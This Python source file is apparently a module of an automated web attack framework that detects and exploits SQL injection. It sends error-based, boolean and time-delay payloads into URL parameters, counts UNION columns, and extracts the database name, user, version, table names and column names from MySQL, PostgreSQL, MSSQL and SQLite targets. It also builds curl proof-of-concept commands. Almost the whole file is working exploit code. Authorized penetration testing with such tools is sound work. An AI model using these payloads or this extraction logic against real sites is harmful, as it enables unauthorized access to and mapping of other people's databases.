"""Multi-Family SQL Injection Attack Module with Deep Exploitation (V15).

Eliminates false positives with triple-layer verification + schema extraction:
1. Mathematical canary validation: AND 7*7=49 (TRUE) vs AND 7*7=50 (FALSE)
2. Precise DBMS error fingerprinting (MySQL, PostgreSQL, MSSQL, Oracle, SQLite)
3. Escalated time-based triple-differential (5s, 7s, 10s)
4. UNION-based database schema extraction (database, tables, columns)
"""

from __future__ import annotations

import logging
import re
import time
from typing import Any, Dict, List, Optional
from urllib.parse import parse_qs, urlencode, urlparse, urlunparse

from app.attacks.base import AttackPlan, BaseAttackModule, ValidationResult
from app.core.session_context import SessionContext
from app.orchestration.attack_opportunity import AttackOpportunity

logger = logging.getLogger("attacks.sqli")

SQL_ERROR_PATTERNS = {
    "MySQL": [
        r"you have an error in your sql syntax",
        r"check the manual that corresponds to your mysql server",
        r"mysql_fetch_array\(\)",
        r"mysql_fetch_assoc\(\)",
    ],
    "PostgreSQL": [
        r"postgresql.*error",
        r"syntax error at or near",
        r"pg_query\(\)",
        r"pg_exec\(\)",
    ],
    "MSSQL": [
        r"microsoft sql server",
        r"unclosed quotation mark after the character string",
        r"syntax error converting the varchar value",
    ],
    "Oracle": [
        r"ora-[0-9]{5}",
        r"oracle error",
    ],
    "SQLite": [
        r"sqlite3::sqliteexception",
        r"sqlite3.operationalerror",
        r"unrecognized token:",
    ],
}

# UNION extraction queries per DBMS (read-only SELECT only)
UNION_EXTRACTION = {
    "MySQL": {
        "db_info": "CONCAT(database(),0x7c,user(),0x7c,version())",
        "tables": "GROUP_CONCAT(table_name SEPARATOR ',')",
        "tables_from": "information_schema.tables WHERE table_schema=database()",
        "columns": "GROUP_CONCAT(column_name SEPARATOR ',')",
        "columns_from": "information_schema.columns WHERE table_schema=database() AND table_name='{table}'",
    },
    "PostgreSQL": {
        "db_info": "current_database()||'|'||current_user||'|'||version()",
        "tables": "string_agg(table_name, ',')",
        "tables_from": "information_schema.tables WHERE table_schema='public'",
        "columns": "string_agg(column_name, ',')",
        "columns_from": "information_schema.columns WHERE table_schema='public' AND table_name='{table}'",
    },
    "MSSQL": {
        "db_info": "DB_NAME()+'|'+SYSTEM_USER+'|'+@@VERSION",
        "tables": "STRING_AGG(table_name, ',')",
        "tables_from": "information_schema.tables WHERE table_type='BASE TABLE'",
        "columns": "STRING_AGG(column_name, ',')",
        "columns_from": "information_schema.columns WHERE table_name='{table}'",
    },
    "SQLite": {
        "db_info": "sqlite_version()",
        "tables": "GROUP_CONCAT(name, ',')",
        "tables_from": "sqlite_master WHERE type='table'",
        "columns": "GROUP_CONCAT(name, ',')",
        "columns_from": "pragma_table_info('{table}')",
    },
}


class SQLiAttackModule(BaseAttackModule):
    def __init__(self) -> None:
        super().__init__(attack_type="sqli", cwe_id="CWE-89", default_severity="CRITICAL")

    async def discover(self, target: str, context: Dict[str, Any]) -> List[AttackOpportunity]:
        opps: List[AttackOpportunity] = []
        urls = context.get("urls", [])
        for u in urls:
            parsed = urlparse(u)
            if parsed.query:
                params = parse_qs(parsed.query)
                for p in params:
                    opps.append(
                        AttackOpportunity(
                            target=target,
                            endpoint=u,
                            parameter=p,
                            attack_type="sqli",
                            hypothesis=f"Parameter '{p}' on {parsed.path} may be vulnerable to SQL injection.",
                            priority=90,
                        )
                    )
        return opps

    async def plan(self, opportunity: AttackOpportunity) -> AttackPlan:
        return AttackPlan(
            title=f"Multi-Family SQL Injection Audit + Schema Extraction on {opportunity.parameter}",
            attack_type="sqli",
            target=opportunity.endpoint,
            steps=[
                "1. Baseline response capture",
                "2. Mathematical boolean differential verification (7*7=49 vs 7*7=50)",
                "3. Multi-DBMS syntax error probing",
                "4. Escalated time-based triple-differential (5s, 7s, 10s)",
                "5. UNION column count detection",
                "6. Deep exploitation — database schema extraction (database, tables, columns)",
            ],
            payloads=[
                "' OR 7*7=49 -- -",
                "' OR 7*7=50 -- -",
                "' UNION SELECT 1,2,3,4,5 -- -",
                "' OR SLEEP(5)-- -",
            ],
            expected_evidence="Differential response behavior, DBMS error signature, or extracted database schema.",
            context={"parameter": opportunity.parameter},
        )

    async def validate(self, opportunity: AttackOpportunity, session: SessionContext) -> ValidationResult:
        endpoint = opportunity.endpoint
        param = opportunity.parameter
        if not param:
            return ValidationResult(
                is_vulnerable=False,
                confidence=0.0,
                proof_level="P0",
                attack_type="sqli",
                target_url=endpoint,
                message="No parameter specified for SQLi testing.",
            )

        parsed = urlparse(endpoint)
        query_params = parse_qs(parsed.query)
        orig_val = query_params.get(param, ["1"])[0]

        # 1. Baseline Request
        baseline_resp = await session.get(endpoint)
        if not baseline_resp.is_success and not baseline_resp.status_code:
            return ValidationResult(
                is_vulnerable=False,
                confidence=0.0,
                proof_level="P0",
                attack_type="sqli",
                target_url=endpoint,
                parameter=param,
                message="Baseline endpoint unreachable.",
            )

        baseline_len = baseline_resp.content_length
        baseline_text = baseline_resp.text

        # 2. Syntax Error Probes
        detected_dbms = None
        error_probes = ["'", "''", "')", "';"]
        for probe in error_probes:
            test_params = dict(query_params)
            test_params[param] = [f"{orig_val}{probe}"]
            probe_query = urlencode(test_params, doseq=True)
            probe_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, probe_query, parsed.fragment))

            err_resp = await session.get(probe_url)
            err_body = err_resp.text.lower()

            for dbms, patterns in SQL_ERROR_PATTERNS.items():
                for pat in patterns:
                    if re.search(pat, err_body) and not re.search(pat, baseline_text.lower()):
                        detected_dbms = dbms

                        # Try UNION extraction right away
                        exploitation_data = await self._exploit_extract_schema(
                            session, endpoint, param, query_params, parsed, dbms,
                        )

                        poc_curl = f"curl -s -k '{probe_url}'"
                        return ValidationResult(
                            is_vulnerable=True,
                            confidence=0.98 if exploitation_data else 0.95,
                            proof_level="P5" if exploitation_data else "P3",
                            attack_type="sqli",
                            target_url=endpoint,
                            parameter=param,
                            baseline_status=baseline_resp.status_code,
                            exploit_status=err_resp.status_code,
                            evidence={
                                "dbms": dbms,
                                "error_signature": pat,
                                "probe": probe,
                                "type": "ERROR_BASED",
                                "response_sample": err_resp.text[:300],
                            },
                            exploitation_data=exploitation_data or {},
                            poc_curl=poc_curl,
                            message=f"CRITICAL: Error-based SQL Injection confirmed on parameter '{param}' ({dbms} DBMS detected)."
                                    + (f" Database schema extracted: {exploitation_data.get('database_name', 'N/A')}" if exploitation_data else ""),
                            cwe_id="CWE-89",
                            severity="CRITICAL",
                        )

        # 3. Mathematical Canary Boolean Differential: 7*7=49 (TRUE) vs 7*7=50 (FALSE)
        true_payload = f"{orig_val}' AND 7*7=49 AND '1'='1"
        false_payload = f"{orig_val}' AND 7*7=50 AND '1'='1"

        t_params = dict(query_params)
        t_params[param] = [true_payload]
        true_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, urlencode(t_params, doseq=True), parsed.fragment))
        true_resp = await session.get(true_url)

        f_params = dict(query_params)
        f_params[param] = [false_payload]
        false_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, urlencode(f_params, doseq=True), parsed.fragment))
        false_resp = await session.get(false_url)

        if true_resp.status_code == baseline_resp.status_code:
            true_len_diff = abs(true_resp.content_length - baseline_len)
            false_len_diff = abs(false_resp.content_length - baseline_len)

            if true_len_diff < 50 and false_len_diff > 100:
                # Try UNION extraction
                exploitation_data = await self._exploit_extract_schema(
                    session, endpoint, param, query_params, parsed, detected_dbms or "MySQL",
                )

                poc_curl = f"curl -s -k '{true_url}'"
                return ValidationResult(
                    is_vulnerable=True,
                    confidence=0.96 if exploitation_data else 0.92,
                    proof_level="P5" if exploitation_data else "P3",
                    attack_type="sqli",
                    target_url=endpoint,
                    parameter=param,
                    baseline_status=baseline_resp.status_code,
                    exploit_status=true_resp.status_code,
                    evidence={
                        "type": "BOOLEAN_MATHEMATICAL_CANARY",
                        "true_payload": true_payload,
                        "false_payload": false_payload,
                        "true_length": true_resp.content_length,
                        "false_length": false_resp.content_length,
                        "baseline_length": baseline_len,
                    },
                    exploitation_data=exploitation_data or {},
                    poc_curl=poc_curl,
                    message=f"CRITICAL: Boolean-based SQL Injection confirmed on parameter '{param}' with mathematical canary."
                            + (f" Database: {exploitation_data.get('database_name', 'N/A')}" if exploitation_data else ""),
                    cwe_id="CWE-89",
                    severity="CRITICAL",
                )

        # 4. Escalated Time-Based verification (5s, 7s, 10s)
        time_result = await self._test_escalated_time(session, endpoint, param, query_params, parsed, baseline_text)
        if time_result:
            return time_result

        return ValidationResult(
            is_vulnerable=False,
            confidence=0.2,
            proof_level="P0",
            attack_type="sqli",
            target_url=endpoint,
            parameter=param,
            baseline_status=baseline_resp.status_code,
            exploit_status=true_resp.status_code,
            message=f"Parameter '{param}' showed no boolean, error-based, or time-based SQL injection response differences.",
        )

    async def _test_escalated_time(
        self,
        session: SessionContext,
        endpoint: str,
        param: str,
        query_params: dict,
        parsed: Any,
        baseline_text: str,
    ) -> Optional[ValidationResult]:
        """Escalated time-based: test with 5s, 7s, 10s delays — all must be proportional."""
        time_templates = [
            ("' OR SLEEP({d})-- -", "MySQL"),
            ("'; WAITFOR DELAY '0:0:{d}'--", "MSSQL"),
            ("' OR pg_sleep({d})--", "PostgreSQL"),
        ]

        orig_val = query_params.get(param, ["1"])[0]

        for template, dbms in time_templates:
            escalation_results = []
            all_passed = True

            for delay in [5, 7, 10]:
                payload = f"{orig_val}{template.replace('{d}', str(delay))}"
                t_params = dict(query_params)
                t_params[param] = [payload]
                probe_url = urlunparse((
                    parsed.scheme, parsed.netloc, parsed.path, parsed.params,
                    urlencode(t_params, doseq=True), parsed.fragment,
                ))

                t0 = time.monotonic()
                resp = await session.get(probe_url)
                elapsed = time.monotonic() - t0

                if elapsed >= delay * 0.75:
                    escalation_results.append({
                        "delay_requested": delay,
                        "elapsed_ms": round(elapsed * 1000),
                        "payload": payload[:100],
                    })
                else:
                    all_passed = False
                    break

            if all_passed and len(escalation_results) >= 3:
                times = [r["elapsed_ms"] for r in escalation_results]
                if times[1] > times[0] + 500 and times[2] > times[1] + 500:
                    poc_curl = f"curl -s -k '{probe_url}'"
                    return ValidationResult(
                        is_vulnerable=True,
                        confidence=0.97,
                        proof_level="P4",
                        attack_type="sqli",
                        target_url=endpoint,
                        parameter=param,
                        evidence={
                            "type": "TIME_BASED_ESCALATED",
                            "dbms": dbms,
                            "escalation_results": escalation_results,
                            "proportional_scaling": True,
                        },
                        poc_curl=poc_curl,
                        message=f"CRITICAL: Time-based SQL Injection confirmed on parameter '{param}' ({dbms}) with escalated triple-differential (5s/7s/10s).",
                        cwe_id="CWE-89",
                        severity="CRITICAL",
                    )
        return None

    async def _exploit_extract_schema(
        self,
        session: SessionContext,
        endpoint: str,
        param: str,
        query_params: dict,
        parsed: Any,
        dbms: str,
    ) -> Optional[Dict[str, Any]]:
        """Extract database schema via UNION injection (read-only SELECT only)."""
        orig_val = query_params.get(param, ["1"])[0]

        # First detect column count
        column_count = await self._detect_column_count(session, endpoint, param, query_params, parsed)
        if column_count == 0:
            return None

        engine_key = dbms
        if engine_key not in UNION_EXTRACTION:
            for key in UNION_EXTRACTION:
                if key.lower() in dbms.lower():
                    engine_key = key
                    break
            else:
                engine_key = "MySQL"

        queries = UNION_EXTRACTION[engine_key]
        exploitation: Dict[str, Any] = {"column_count": column_count}

        # 1. Extract db_info (name, user, version)
        db_info = await self._union_extract(
            session, endpoint, param, query_params, parsed, column_count,
            queries["db_info"],
        )
        if db_info:
            parts = db_info.split("|")
            if len(parts) >= 1:
                exploitation["database_name"] = parts[0]
            if len(parts) >= 2:
                exploitation["database_user"] = parts[1]
            if len(parts) >= 3:
                exploitation["database_version"] = parts[2][:50]

        # 2. Extract table names
        tables_raw = await self._union_extract(
            session, endpoint, param, query_params, parsed, column_count,
            queries["tables"], from_clause=queries["tables_from"],
        )
        if tables_raw:
            tables = [t.strip() for t in tables_raw.split(",") if t.strip()][:10]
            exploitation["tables"] = tables

            # 3. Extract columns for first 5 tables
            columns: Dict[str, List[str]] = {}
            for tbl in tables[:5]:
                cols_raw = await self._union_extract(
                    session, endpoint, param, query_params, parsed, column_count,
                    queries["columns"],
                    from_clause=queries["columns_from"].replace("{table}", tbl),
                )
                if cols_raw:
                    columns[tbl] = [c.strip() for c in cols_raw.split(",") if c.strip()][:10]

            if columns:
                exploitation["columns"] = columns

        return exploitation if len(exploitation) > 1 else None

    async def _detect_column_count(
        self,
        session: SessionContext,
        endpoint: str,
        param: str,
        query_params: dict,
        parsed: Any,
    ) -> int:
        """Detect UNION column count."""
        orig_val = query_params.get(param, ["1"])[0]

        for count in range(1, 12):
            nulls = ",".join(["NULL"] * count)
            payload = f"{orig_val}' UNION SELECT {nulls}-- -"
            t_params = dict(query_params)
            t_params[param] = [payload]
            probe_url = urlunparse((
                parsed.scheme, parsed.netloc, parsed.path, parsed.params,
                urlencode(t_params, doseq=True), parsed.fragment,
            ))

            resp = await session.get(probe_url)
            if resp.status_code == 200 and resp.content_length > 100:
                # Check that no SQL error is present
                body_lower = resp.text.lower()
                has_error = any(
                    re.search(pat, body_lower)
                    for patterns in SQL_ERROR_PATTERNS.values()
                    for pat in patterns
                )
                if not has_error:
                    return count

        return 0

    async def _union_extract(
        self,
        session: SessionContext,
        endpoint: str,
        param: str,
        query_params: dict,
        parsed: Any,
        column_count: int,
        select_expr: str,
        from_clause: str = "",
    ) -> Optional[str]:
        """Execute UNION SELECT and extract the injected value."""
        orig_val = query_params.get(param, ["1"])[0]

        # Build UNION payload
        cols = []
        for i in range(column_count):
            if i == 0:
                cols.append(select_expr)
            else:
                cols.append("NULL")

        if from_clause:
            payload = f"{orig_val}' UNION SELECT {','.join(cols)} FROM {from_clause}-- -"
        else:
            payload = f"{orig_val}' UNION SELECT {','.join(cols)}-- -"

        t_params = dict(query_params)
        t_params[param] = [payload]
        probe_url = urlunparse((
            parsed.scheme, parsed.netloc, parsed.path, parsed.params,
            urlencode(t_params, doseq=True), parsed.fragment,
        ))

        # Get baseline for diff
        baseline_resp = await session.get(endpoint)
        exploit_resp = await session.get(probe_url)

        if exploit_resp.status_code != 200:
            return None

        # Find new content in exploit response
        baseline_lines = set(baseline_resp.text.splitlines())
        new_content = []
        for line in exploit_resp.text.splitlines():
            stripped = line.strip()
            if stripped and line not in baseline_lines and stripped.lower() not in ("null", ""):
                clean = re.sub(r"<[^>]+>", "", stripped).strip()
                if clean and clean.lower() not in ("null", ""):
                    new_content.append(clean)

        if new_content:
            best = max(new_content, key=len)
            if len(best) > 1:
                return best

        return None
